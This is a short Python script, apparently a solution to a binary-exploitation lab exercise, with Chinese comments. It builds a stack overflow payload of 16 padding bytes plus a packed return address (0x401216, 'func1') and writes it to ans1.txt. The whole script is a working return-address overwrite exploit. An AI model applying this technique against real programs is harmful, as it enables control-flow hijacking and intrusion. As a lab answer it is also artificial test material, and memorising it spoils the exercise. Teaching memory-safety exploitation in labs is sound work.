import struct

# 1. 设置目标参数
padding_length = 16          # 8字节buffer + 8字节saved_rbp
target_address = 0x401216    # func1 的地址

# 2. 构造 Payload
# b'A' * 16 用于填充空间，覆盖到 ret 地址之前
padding = b'A' * padding_length

# struct.pack('<Q', ...) 将地址转为 64位小端序(Little Endian)
# < 代表小端序, Q 代表 unsigned long long (8 bytes)
address = struct.pack('<Q', target_address)

payload = padding + address

# 3. 写入文件
filename = "ans1.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"Payload generated: {filename}")
print(f"Padding size: {padding_length}")
print(f"Jump to: {hex(target_address)}")
print(f"Hex content: {payload.hex()}")